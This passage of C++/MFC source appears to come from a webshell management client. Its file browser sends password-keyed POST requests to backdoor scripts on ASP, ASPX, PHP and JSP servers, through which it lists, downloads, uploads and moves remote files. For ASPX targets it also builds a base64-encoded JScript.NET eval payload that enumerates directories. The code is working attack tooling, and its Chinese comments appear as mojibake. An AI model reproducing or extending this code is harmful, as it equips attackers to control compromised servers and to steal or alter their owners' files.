	FunFileInfo* pInfo = (FunFileInfo*)lpParameter;

	CString szSiteUrl_pInfo = pInfo->szSiteUrl;
	CString szSitePass_pInfo = pInfo->szSitePass;
	int nSiteCode_pInfo = pInfo->nSiteCode;
	int nSiteScript_pInfo = pInfo->nSiteScript;
	CString szSavePath_pInfo = pInfo->szS1;
	CString szRemotePath_pInfo = pInfo->szS2;

	CString sz_edit;
	sz_edit = szRemotePath_pInfo;
	sz_edit.Replace("\\\\", "\\");//�ÿ�һ�����
	m_edit.SetWindowText( "Downloading: "+ sz_edit );					//����״̬��

	CString aaa,szHost,szPort,szPath;
	bool bIsSSL = UrlExplode(szSiteUrl_pInfo, szHost, szPort, szPath);
	
	bool bDownLoad;
	szRemotePath_pInfo = UrlEnCode(nSiteCode_pInfo, szRemotePath_pInfo);
	if (nSiteScript_pInfo == 1)								//	ASP
	{
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo + szFileDownFile[0] + szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}
	else if (nSiteScript_pInfo == 2)							//  ASPX
	{
		aaa.Format("%d", nSiteCode_pInfo);
		szRemotePath_pInfo = szFileDownFile[1] + szRemotePath_pInfo;
		szRemotePath_pInfo.Replace("%nPageCode%", aaa);
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo + szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}
	else if(nSiteScript_pInfo == 3)							//  PHP
	{
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo + szFileDownFile[2] + szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}
	else if (nSiteScript_pInfo == 4)							//  JSP
	{
		CString szSiteCode = "";
		if (nSiteCode_pInfo == 65001)
		{
			szSiteCode = "UTF-8";
		}
		else if (nSiteCode_pInfo == 936)
		{
			szSiteCode = "GB2312";
		}
		else if (nSiteCode_pInfo == 950)
		{
			szSiteCode = "BIG5";
		}
		bDownLoad = HttpDown_GP(bIsSSL, "POST", szHost, szPath, szSitePass_pInfo +"=F&z0="+ szSiteCode +"&z1="+ szRemotePath_pInfo, "", atoi(szPort), true, szSavePath_pInfo, aaa);
	}

	delete pInfo;
	if (bDownLoad)
	{
		m_edit.SetWindowText( "The download is complete: "+ sz_edit );					//����״̬��
		if (bIsOpenDir)
		{
			bIsOpenDir = false;
			ShellExecute(NULL, "Open", _T("Explorer.exe"), _T(" /select,") + szSavePath_pInfo, NULL, SW_SHOWNORMAL);
		}
	}else{
		m_edit.SetWindowText( "File download failed : "+ sz_edit +"\tError: "+ aaa);					//����״̬��
	}
	return 0;
}


void CFileDlg::OnFileClearCache()			//��ջ���
{
	if ( pMydbTmp->Execute("Delete from CACHE where Item like '"+ szCacheItem + "%'") )
	{
		m_edit.SetWindowText( "Clear Cache Success" );					//����״̬��
	}else{
		m_edit.SetWindowText( "Clear Cache Failed" );					//����״̬��
	}
}

void CFileDlg::OnDropFiles(HDROP hDropInfo)													//�Ϸ� �ļ��ϴ�
{
	::SetForegroundWindow(GetSafeHwnd());	//�϶�,����������

	CString szOnDropFilePath,	//�϶����ļ�ȫ·����
		szOnDropFile;			//�϶����ļ���

	bool bFileExist = false;	//�ļ��Ƿ����
	bool bUpOK = false;			//�ϴ��Ƿ�ɹ�

	// ����һ������������Ŷ�ȡ���ļ�����Ϣ
	char szFileName[MAX_PATH + 1] = {0};
	// ͨ������iFiles����Ϊ0xFFFFFFFF,����ȡ�õ�ǰ�϶����ļ�������
	// ������Ϊ0xFFFFFFFF,��������Ժ�������������
	UINT nFiles = DragQueryFile(hDropInfo, 0xFFFFFFFF, NULL, 0);
	if ( nFiles )
	{
		// ͨ��ѭ������ȡ���϶��ļ���File Name��Ϣ
		for(UINT i=0; i<nFiles; i++)
		{
			DragQueryFile(hDropInfo, i, szFileName, MAX_PATH);
			szOnDropFilePath = szFileName;
			bFileExist = false;

			szOnDropFile = szOnDropFilePath.Right( rfind(szOnDropFilePath, "\\")-1 ); //ȡ���ļ���

			for(int i = 0; i < m_filelist.GetItemCount(); ++i)
			{
				if (IsWin)
				{
					if (_stricmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}else{
					if (strcmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}
			}
			CString szEditPath;
			GetDlgItemText(IDC_COMBO_FILEPATH, szEditPath);
			//szEditPath.Replace("\\","\\\\");		//ȡ��Զ�̵�·��	2015.01.20 IPC BUG
			szEditPath = szEditPath + szOnDropFile;		//·�������ļ���

			FunFileInfo *pInfo;
			pInfo = new FunFileInfo;
			pInfo->szSiteUrl = szSiteUrl;
			pInfo->szSitePass = szSitePass;
			pInfo->nSiteCode = nSiteCode;
			pInfo->nSiteScript = nSiteScript;
			pInfo->szS1 = szEditPath;
			pInfo->szS2 = szOnDropFilePath;
			pInfo->pHwnd = this;
			Sleep(100);

			if (!bFileExist)
			{
				//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
				CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
			}else{
				if (MessageBox(szOnDropFile + " This file already exists. Replace existing file? ", "", MB_OKCANCEL) == IDOK)
				{
					//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
					CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
				}else{
					delete pInfo;
				}
			}
		}
		//�ϴ���ɣ�ˢ���б�
		//CString szRefreshPath;
		//GetDlgItemText(IDC_EDIT_PATH,szRefreshPath);
		//GetFiles(szRefreshPath, true);
	}
	// �����˴���ק���������ͷŷ������Դ
	DragFinish(hDropInfo);
	CDialog::OnDropFiles(hDropInfo);
}


void CFileDlg::OnNMClickTree1(NMHDR *pNMHDR, LRESULT *pResult)												//�������� ��ȡӲ���ļ����ĳ� OnTvnSelchangingFileTree
{
	*pResult = 0;
	
	CPoint point;
	GetCursorPos(&point);//����������λ��
	m_dirtree.ScreenToClient(&point);//ת��Ϊ�ͻ�����
	UINT uFlags;
	HTREEITEM CurrentItem = m_dirtree.HitTest(point, &uFlags);	//��õ�ǰ����ڵ��ITEM

	CString szClickText,szSelectedText,szCOMBOText;
	szClickText = m_dirtree.GetItemText(CurrentItem);			//��ýڵ�ֵ
	szSelectedText = m_dirtree.GetItemText( m_dirtree.GetSelectedItem() );

	if (bThreadFinish && szClickText !="" && szClickText == szSelectedText)	//��ǰѡ�еģ���֮ǰ��һ����
	{
		GetDlgItemText(IDC_COMBO_FILEPATH, szCOMBOText);
		if ( szCOMBOText != "" )
		{
			if (IsWin)
			{
				if (szCOMBOText.Right(szClickText.GetLength() + 1) == szClickText + "\\")
				{
					return;
				}
			}else{
				if (szCOMBOText.Right(szClickText.GetLength() + 1) == szClickText + "/")
				{
					return;
				}
			}
			
			CString strReturn;
			CString strTemp;
			while ( CurrentItem )
			{
				strTemp  = m_dirtree.GetItemText( CurrentItem );

				if (IsWin)
				{
					strTemp += "\\";										//ע�� LINUX
				}else{
					if (strTemp != "/")
					{
						strTemp += "/";										//ע�� LINUX
					}
				}
				strReturn = strTemp + strReturn;
				CurrentItem = m_dirtree.GetParentItem( CurrentItem );
			}
			GetFiles_szPath = strReturn;
			GetFiles_bNoDB = false;//Ĭ�� false
			bThreadFinish = false;
			CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);
		}
	}
}

void CFileDlg::OnFileEditFile()											//�ļ��༭
{
	CString temp;
	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//������ȡ�б�����ݵ�С���⡣

	GetDlgItemText(IDC_COMBO_FILEPATH, temp);

	LV_ITEM lvitem = {0};
	lvitem.iItem = nList;
	lvitem.iSubItem = 0;
	lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;				//����ͼ���ж��ļ�����
	m_filelist.GetItem(&lvitem);

	if (lvitem.iImage== 0)				// ���ļ���
	{
	}else{																		// ���ļ����༭�ļ�
		//AfxMessageBox("�ļ��༭: "+ temp+ m_filelist.GetItemText(nList,0));
		CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
		szGlobal_SiteUrl = szSiteUrl;
		szGlobal_SitePass = szSitePass;
		nGlobal_SiteScript = nSiteScript;
		nGlobal_SiteCode = nSiteCode;
		szGlobal_SiteFileSave = temp+ m_filelist.GetItemText(nList,0);
		pMainHatchet->AddFileSaveTab();

	}
	return;
}


void CFileDlg::OnFileDownloadFile()											//�����ļ�
{
	POSITION pos = m_filelist.GetFirstSelectedItemPosition();
	if (!pos)
	{
		return;
	}
	CFileDialog hFileDlg(FALSE,NULL ,NULL,OFN_OVERWRITEPROMPT | OFN_HIDEREADONLY | OFN_NOCHANGEDIR,TEXT("All files(*.*)|*.*|"));

	CString szDLFilePath,szDLFileName,szRemotePath;

	GetDlgItemText(IDC_COMBO_FILEPATH, szDLFilePath);
	//szDLFilePath.Replace("\\","\\\\");		//ȡ��Զ�̵�·��	2015.01.20 IPC BUG

	LV_ITEM lvitem = {0};					//����ͼ���ж��ļ�����
	CString szSelectDir = "";				//Ҫ�����ļ��У�ֻҪ����һ�Σ�ѡ��Ŀ¼�ͺ�
	bIsOpenDir = true;						//�����ļ���ɣ��Ƿ���ļ��С�������ص���Ŀ¼��һ�ξͺá�
	while (pos)
	{
		int nList = m_filelist.GetNextSelectedItem(pos);
		szDLFileName = m_filelist.GetItemText(nList, 0);
		szRemotePath = szDLFilePath + szDLFileName;

		lvitem.iItem = nList;
		lvitem.iSubItem = 0;
		lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;
		m_filelist.GetItem(&lvitem);
		if (lvitem.iImage == 0)				// ���ļ���
		{
			//AfxMessageBox("Software is improving!");
			//////////////////////////////////////////////////////////////////////////
			if (szSelectDir == "")
			{
				char szDir[MAX_PATH];
				BROWSEINFO bi;
				ITEMIDLIST *pidl;
				bi.hwndOwner = this->m_hWnd;
				bi.pidlRoot = NULL;
				bi.pszDisplayName = szDir;
				bi.lpszTitle = "Select";
				bi.ulFlags = BIF_RETURNONLYFSDIRS;
				bi.lpfn = NULL;
				bi.lParam = 0;
				bi.iImage = 0;
				pidl = SHBrowseForFolder(&bi);
				if(pidl && SHGetPathFromIDList(pidl, szDir) )
				{
					if (IsWin)
					{
						szSelectDir.Format("%s\\", szDir);
					}else{
						szSelectDir.Format("%s/", szDir);
					}
				}
			}
			if (szSelectDir == "")
			{
				continue;
			}
			if ( SHCreateDirectoryEx(NULL, szSelectDir + szDLFileName +"\\", NULL) != ERROR_SUCCESS)
			{
				AfxMessageBox("Failed to create directory,May already exist.\r\n"+ szSelectDir + szDLFileName +"\\");
				break;
			}

			FunFileInfo *pInfo;
			pInfo = new FunFileInfo;
			pInfo->szSiteUrl = szSiteUrl;
			pInfo->szSitePass = szSitePass;
			pInfo->nSiteCode = nSiteCode;
			pInfo->nSiteScript = nSiteScript;
			pInfo->pHwnd = this;
			if (IsWin)
			{
				pInfo->szS1 = szRemotePath +"\\\\";
				pInfo->szS2 = szSelectDir + szDLFileName +"\\";
				Sleep(100);
				CreateThread(NULL, 0, FunDownDirGetFiles, pInfo, 0, 0);
			}else{
				pInfo->szS1 = szRemotePath +"/";
				pInfo->szS2 = szSelectDir + szDLFileName +"\\";
				Sleep(100);
				CreateThread(NULL, 0, FunDownDirGetFiles, pInfo, 0, 0);
			}
			//////////////////////////////////////////////////////////////////////////
		}else{
			hFileDlg.m_ofn.lpstrFile = szDLFileName.GetBuffer(MAX_PATH);
			hFileDlg.m_ofn.nMaxFile = MAX_PATH;
			if(hFileDlg.DoModal() == IDOK)
			{
				//FunDownloadFile( hFileDlg.GetPathName(), szRemotePath );

				FunFileInfo *pInfo;
				pInfo = new FunFileInfo;
				pInfo->szSiteUrl = szSiteUrl;
				pInfo->szSitePass = szSitePass;
				pInfo->nSiteCode = nSiteCode;
				pInfo->nSiteScript = nSiteScript;
				pInfo->szS1 = hFileDlg.GetPathName();
				pInfo->szS2 = szRemotePath;
				Sleep(100);
				CreateThread(NULL, 0, FunDownloadFile, pInfo, 0, 0);
			}
			szDLFileName.ReleaseBuffer();
		}
	}
	m_filelist.SetFocus();
}


//bool CFileDlg::DownDirGetFiles(CString szPath, CString szLocalPath)		//����Ŀ¼
DWORD WINAPI FunDownDirGetFiles(LPVOID lpParameter)		//����Ŀ¼
{
	FunFileInfo* pInfo = (FunFileInfo*)lpParameter;

	CString szSiteUrl_pInfo = pInfo->szSiteUrl;
	CString szSitePass_pInfo = pInfo->szSitePass;
	int nSiteCode_pInfo = pInfo->nSiteCode;
	int nSiteScript_pInfo = pInfo->nSiteScript;
	CString szPath = pInfo->szS1;
	CString szLocalPath = pInfo->szS2;

	CString szSiteCode;
	if (nSiteCode_pInfo == 65001)
	{
		szSiteCode = "UTF-8";
	}
	else if (nSiteCode_pInfo == 936)
	{
		szSiteCode = "GB2312";
	}
	else if (nSiteCode_pInfo == 950)
	{
		szSiteCode = "BIG5";
	}

	CString temp;
	CString szFileFamatPageCode;//��ʱ������ʽ����
	if (nSiteScript_pInfo == 1)								//	ASP
	{
		temp = UrlEnCode(nSiteCode_pInfo, szPath, false, true);
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileGetFiles[0] + "&z1="+temp, nSiteCode_pInfo, temp, szError);
	}else if (nSiteScript_pInfo == 2)							//  ASPX
	{
		szFileFamatPageCode.Format("%d", nSiteCode_pInfo);
		temp = MyBase64Encode(nSiteCode_pInfo, szPath);
		temp = szFileGetFiles[1] + "&z1="+temp;
		temp.Replace("%nPageCode%", szFileFamatPageCode);

		CString szBase64EvalCode = "var D=System.Text.Encoding.GetEncoding("+ szFileFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
			"var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{re"
			"turn System.IO.File.GetLastWriteTime(p).ToString(\"yyyy-MM-dd HH:mm:ss\");}for(i in s){P=D+s[i].Name;Response.W"
			"rite(s[i].Name+\"/\t\"+T(P)+\"\t0\t-\n\");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\""
			"\t\"+T(P)+\"\t\"+s[i].Length+\"\t-\n\");}";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + temp, nSiteCode_pInfo, temp, szError);
	}else if(nSiteScript_pInfo == 3){							//  PHP
		temp = MyBase64Encode(nSiteCode_pInfo, szPath);
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileGetFiles[2] + "&z1="+temp, nSiteCode_pInfo, temp, szError);
	}else if (nSiteScript_pInfo == 4)							//  JSP
	{
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + "=B&z0="+szSiteCode+ "&z1="+ UrlEnCode(nSiteCode_pInfo, szPath), nSiteCode_pInfo, temp, szError);
	}
	
	if (!bHttpIsOK || temp == "")
	{
		delete pInfo;
		AfxMessageBox( szError );
		return false;
	}

	CString szFileNameLine;
	CString szFileName;
	int posX=0;
	int posY=0;

	int posA = 0,			//decodeCString �����ݴ���������
		posB = 0;
	while( posA != -1 )
	{
		posA = temp.Find("\n", posB + 1);
		if (posA == -1)
		{
			break;
		}

		szFileNameLine = temp.Mid(posB, posA - posB);
		szFileNameLine.TrimLeft();
		szFileNameLine.TrimRight();
		posB = posA;
		//szFileNameLine = DelCRLF(filesline.GetAt(i));


		posX = szFileNameLine.Find("\t");
		posY = szFileNameLine.Find("\t", posX+1);
		szFileName = szFileNameLine.Mid(0,posX);

		
		if (szFileName != "./" && szFileName != "../" && szFileName != "")
		{
			int szFileNameLen = szFileName.GetLength();
			if (szFileName[szFileNameLen-1] == '/')			//���ļ���
			{
				szFileName.Replace("/","");
				if ( SHCreateDirectoryEx(NULL, szLocalPath + szFileName +"\\", NULL) != ERROR_SUCCESS)
				{
					AfxMessageBox("Failed to create directory,May already exist.\r\n"+ szLocalPath + szFileName +"\\");
				}else{

					FunFileInfo *pInfo3;
					pInfo3 = new FunFileInfo;
					pInfo3->szSiteUrl = szSiteUrl_pInfo;
					pInfo3->szSitePass = szSitePass_pInfo;
					pInfo3->nSiteCode = nSiteCode_pInfo;
					pInfo3->nSiteScript = nSiteScript_pInfo;
					pInfo3->szS2 = szLocalPath + szFileName +"\\";
					pInfo3->pHwnd = pInfo->pHwnd;
					if (pInfo->pHwnd->IsWin)
					{
						pInfo3->szS1 = szPath + szFileName + "\\\\";
						FunDownDirGetFiles( pInfo3 );
					}else{
						pInfo3->szS1 = szPath + szFileName + "/";
						FunDownDirGetFiles( pInfo3 );
					}
				}
			}else{																		//�����ļ���
				//FunDownloadFile( szLocalPath + szFileName, szPath + szFileName );
				FunFileInfo *pInfo2;
				pInfo2 = new FunFileInfo;
				pInfo2->szSiteUrl = szSiteUrl_pInfo;
				pInfo2->szSitePass = szSitePass_pInfo;
				pInfo2->nSiteCode = nSiteCode_pInfo;
				pInfo2->nSiteScript = nSiteScript_pInfo;
				pInfo2->szS1 = szLocalPath + szFileName;
				pInfo2->szS2 = szPath + szFileName;
				Sleep(100);
				//CreateThread(NULL, 0, FunDownloadFile, pInfo, 0, 0);
				//����Ҫ�̣߳�ֱ�Ӷ�DownDirGetFiles�����̡߳�
				FunDownloadFile(pInfo2);
			}
		}
	}

	delete pInfo;
	return 0;
}


void CFileDlg::OnFileCut()															//�ļ�����
{
	szFileCopyName = "";

	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;
	GetDlgItemText(IDC_COMBO_FILEPATH,szFileCutPath);
	szFileCutName = m_filelist.GetItemText(nList,0);
	m_edit.SetWindowText( szFileCutName + " Have been cut, select the directory Paste!" );					//����״̬��
	m_filelist.SetFocus();
}
void CFileDlg::OnFileCopy()															//�ļ�����
{
	szFileCutName = "";

	int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;
	GetDlgItemText(IDC_COMBO_FILEPATH,szFileCopyPath);
	szFileCopyName = m_filelist.GetItemText(nList,0);
	m_edit.SetWindowText( szFileCopyName + " Have been copied, select the directory Paste!" );					//����״̬��
	m_filelist.SetFocus();
}


void CFileDlg::OnFilePaste()					//�ļ�ճ��
{
	CString temp,szPastePath;
	GetDlgItemText(IDC_COMBO_FILEPATH,szPastePath);

	if (szFileCutName != "")																//�ļ�����
	{
		if (nSiteScript == 1)								//	ASP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCut[0] + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
		}else if (nSiteScript == 2)							//  ASPX
		{
			temp = szFileCut[1];
			szFileFamatPageCode.Format("%d", nSiteCode);
			temp.Replace("%nPageCode%", szFileFamatPageCode);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
		}else if(nSiteScript == 3){							//  PHP
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCut[2] + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
		}else if (nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=H&z0="+ szSiteCode +"&z1=" + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCutName), nSiteCode, temp, szError);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=E&z0="+ szSiteCode +"&z1=" + UrlEnCode(nSiteCode, szFileCutPath + szFileCutName), nSiteCode, temp, szError);
		}
	}
	//////////////////////////////////////////////////////////////////////////
	if (szFileCopyName != "")																//�ļ�����
	{
		if (nSiteScript == 1)								//	ASP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCopy[0] + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}else if (nSiteScript == 2)							//  ASPX
		{
			temp = szFileCopy[1];
			szFileFamatPageCode.Format("%d", nSiteCode);
			temp.Replace("%nPageCode%", szFileFamatPageCode);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}else if(nSiteScript == 3){							//  PHP
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileCopy[2] + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}else if (nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + "=H&z0="+ szSiteCode +"&z1=" + UrlEnCode(nSiteCode, szFileCopyPath + szFileCopyName) +"&z2="+ UrlEnCode(nSiteCode, szPastePath + szFileCopyName), nSiteCode, temp, szError);
		}
	}

	if (szFileCutName == "" && szFileCopyName == "")
	{
		m_edit.SetWindowText( "Paste Error,Clipboard is empty!" );					//����״̬��
		m_filelist.SetFocus();
		return;
	}
	//////////////////////////////////////////////////////////////////////////

	if (!bHttpIsOK)
	{
		AfxMessageBox( szError );
		return;
	}
	if (temp.Left(8) == "ERROR://")
	{
		m_edit.SetWindowText( temp );					//����״̬��
		m_filelist.SetFocus();
		return;
	}

	if (temp != "1")
	{
		m_edit.SetWindowText( "Paste Error!" );					//����״̬��
	}else{
		OnFileRefresh();
	}
	m_filelist.SetFocus();
}


void CFileDlg::OnTvnSelchangingFileTree(NMHDR *pNMHDR, LRESULT *pResult)				//ѡ����һ������һ��
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	
	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//����״̬��
		*pResult = TRUE;		//���� TRUE ��ֹѡ����һ����� FALSE ������ѡ����һ�
		return;
	}

	HTREEITEM m_hItem = pNMTreeView->itemNew.hItem;

	CString szDrive = m_dirtree.GetItemText(m_hItem);
	if (szDrive != "")
	{
		CString strReturn;
		CString strTemp;
		while ( m_hItem )
		{
			strTemp  = m_dirtree.GetItemText( m_hItem );

			if (IsWin)
			{
				strTemp += "\\";										//ע�� LINUX
			}else{
				if (strTemp != "/")
				{
					strTemp += "/";										//ע�� LINUX
				}
			}
			strReturn = strTemp + strReturn;
			m_hItem = m_dirtree.GetParentItem( m_hItem );
		}
		GetFiles_szPath = strReturn;
		GetFiles_bNoDB = false;//Ĭ�� false
		bThreadFinish = false;
		CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

		//GetFiles(strReturn);/* path = C: \ WWW \ */
	}

	*pResult = 0;
}

void CFileDlg::OnBnClickedUpperstory()			//������һ��
{
	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "GetFiles Threads busy" );					//����״̬��
		return;
	}

	CString temp;
	GetDlgItemText(IDC_COMBO_FILEPATH, temp);

	temp = GetUpperDtoryPath( temp, IsWin );

	SetDlgItemText(IDC_COMBO_FILEPATH, temp);

	OnBnClickedReadfiles();//��ȡ
}
